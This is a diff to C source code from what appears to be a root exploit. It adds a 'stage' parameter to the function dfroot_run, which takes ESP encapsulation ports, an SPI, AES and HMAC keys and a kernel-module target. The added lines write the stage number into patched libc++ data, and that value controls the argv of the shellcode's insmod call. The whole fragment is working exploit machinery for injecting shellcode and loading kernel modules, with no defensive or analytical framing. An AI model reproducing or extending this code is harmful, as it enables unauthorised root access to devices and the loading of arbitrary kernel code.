@@ -593,7 +593,8 @@ static int has_marker(const char *p) { return access(p, F_OK) == 0; }
  * outcome is unknown, 3 when the patches do not land. */
 int dfroot_run(int encap_port, int sender_port, uint32_t spi, int icv_len,
                const uint8_t aes_key[32], const uint8_t hmac_key[32],
-               const char *ko_target, const char *package_name, int soft_reboot) {
+               const char *ko_target, const char *package_name, int soft_reboot,
+               int stage) {
     struct Reporter ro = {0}, *reporter = &ro;
 
     g_encap_port  = encap_port;
@@ -616,6 +617,12 @@ int dfroot_run(int encap_port, int sender_port, uint32_t spi, int icv_len,
     }
     libcxx_soft_reboot = libcxx_data + libcxx_soft_reboot_off;
     *libcxx_soft_reboot = soft_reboot ? 1 : 0;
+    /* stage 0 leaves stage_val zeroed: the shellcode then omits "stage=N"
+     * from the insmod argv and the module runs its full chain. */
+    extern uint32_t libcxx_stage_val_off;
+    char *stageval = libcxx_data + libcxx_stage_val_off;
+    if (stage > 0 && stage <= 3)
+        snprintf(stageval, 12, "%d", stage);
 
     struct PatchRestore libcxx_r = {0};
 
